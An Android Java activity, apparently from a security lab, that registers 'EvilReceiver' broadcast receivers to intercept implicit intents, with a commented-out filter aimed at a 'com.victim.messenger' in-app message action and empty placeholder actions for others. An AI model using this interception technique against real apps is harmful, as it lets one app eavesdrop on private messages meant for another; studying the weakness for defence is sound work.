package com.example.implicit.intents.interception;

import androidx.appcompat.app.AppCompatActivity;
import android.content.BroadcastReceiver;
import android.content.IntentFilter;
import android.os.Bundle;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

//        BroadcastReceiver br = new EvilReceiver();
//        final String ACTION = "com.victim.messenger.IN_APP_MESSAGE";
//        IntentFilter filter = new IntentFilter(ACTION);
//        filter.addCategory("android.intent.category.DEFAULT");
//        getApplicationContext().registerReceiver(br, filter);

//        final String ACT1 = "android.intent.action.CLOSE_SYSTEM_DIALOGS";
        final String ACT1 = "";
        final String ACT2 = "";
//        final String ACT3 = "";
//        final String ACT4 = "";
//        final String ACT5 = "";
//        final String ACT6 = "";
//        final String ACT7 = "";
//        final String ACT8 = "";
//        final String ACT9 = "";
//        final String ACT10 = "";

        BroadcastReceiver br1 = new EvilReceiver();
        IntentFilter filter1 = new IntentFilter(ACT1);
        filter1.addCategory("android.intent.category.DEFAULT");
        getApplicationContext().registerReceiver(br1, filter1);

        BroadcastReceiver br2 = new EvilReceiver();
        IntentFilter filter2 = new IntentFilter(ACT2);
        filter2.addCategory("android.intent.category.DEFAULT");
        getApplicationContext().registerReceiver(br2, filter2);

//        BroadcastReceiver br3 = new EvilReceiver();
//        IntentFilter filter3 = new IntentFilter(ACT3);
//        filter3.addCategory("android.intent.category.DEFAULT");
//        getApplicationContext().registerReceiver(br3, filter3);

//        BroadcastReceiver br4 = new EvilReceiver();
//        IntentFilter filter4 = new IntentFilter(ACT4);
//        filter4.addCategory("android.intent.category.DEFAULT");
//        getApplicationContext().registerReceiver(br4, filter4);
//
//        BroadcastReceiver br5 = new EvilReceiver();
//        IntentFilter filter5 = new IntentFilter(ACT5);
//        filter5.addCategory("android.intent.category.DEFAULT");
//        getApplicationContext().registerReceiver(br5, filter5);
//
//
//        BroadcastReceiver br6 = new EvilReceiver();
//        IntentFilter filter6 = new IntentFilter(ACT6);
//        filter6.addCategory("android.intent.category.DEFAULT");
//        getApplicationContext().registerReceiver(br6, filter6);
//
//
//        BroadcastReceiver br7 = new EvilReceiver();
//        IntentFilter filter7 = new IntentFilter(ACT7);
//        filter7.addCategory("android.intent.category.DEFAULT");
//        getApplicationContext().registerReceiver(br7, filter7);
//
//
//        BroadcastReceiver br8 = new EvilReceiver();
//        IntentFilter filter8 = new IntentFilter(ACT8);
//        filter8.addCategory("android.intent.category.DEFAULT");
//        getApplicationContext().registerReceiver(br8, filter8);
//
//        BroadcastReceiver br9 = new EvilReceiver();
//        IntentFilter filter9 = new IntentFilter(ACT9);
//        filter9.addCategory("android.intent.category.DEFAULT");
//        getApplicationContext().registerReceiver(br9, filter9);

//        BroadcastReceiver br10 = new EvilReceiver();
//        IntentFilter filter10 = new IntentFilter(ACT10);
//        filter10.addCategory("android.intent.category.DEFAULT");
//        getApplicationContext().registerReceiver(br10, filter10);

    }
}